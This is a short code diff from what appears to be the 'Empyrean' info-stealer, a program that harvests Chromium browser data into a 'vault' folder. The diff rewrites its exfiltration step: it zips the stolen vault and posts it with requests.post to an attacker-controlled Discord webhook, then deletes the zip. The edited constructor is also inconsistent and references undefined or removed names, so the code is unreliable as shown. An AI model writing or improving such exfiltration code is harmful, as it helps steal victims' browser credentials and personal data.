@@ -19,7 +19,7 @@ __CARDS__ = []
 
 class Browsers:
     def __init__(self, webhook):
-        self.webhook = SyncWebhook.from_url(webhook)
+        self.webhook_url = webhook_url
 
         Chromium()
         Upload(self.webhook)
@@ -60,16 +60,27 @@ class Upload:
                 zip.write(f"vault\\{file}", file)
 
     def send(self):
-        self.webhook.send(
-            embed=Embed(
-                title="Vault",
-                description="```" +
-                '\n'.join(self.tree(Path("vault"))) + "```",
-            ),
-            file=File("vault.zip"),
-            username="Empyrean",
-            avatar_url="https://i.imgur.com/HjzfjfR.png"
+        embed = Embed(
+            title="Vault",
+            description="```" + '\n'.join(self.tree(Path("vault"))) + "```",
         )
+
+        files = {'file': open('vault.zip', 'rb')}
+
+        webhook_payload = {
+            "content": "Vault Information",
+            "embeds": [embed.to_dict()],
+            "username": "Empyrean",
+            "avatar_url": "https://i.imgur.com/HjzfjfR.png"
+        }
+
+        try:
+            requests.post(self.webhook_url, json=webhook_payload, files=files)
+        except requests.exceptions.RequestException as e:
+            print(f"Erro ao enviar a mensagem: {e}")
+
+        if Path("vault.zip").exists():
+            Path("vault.zip").unlink()
 
     def clean(self):
         shutil.rmtree("vault")
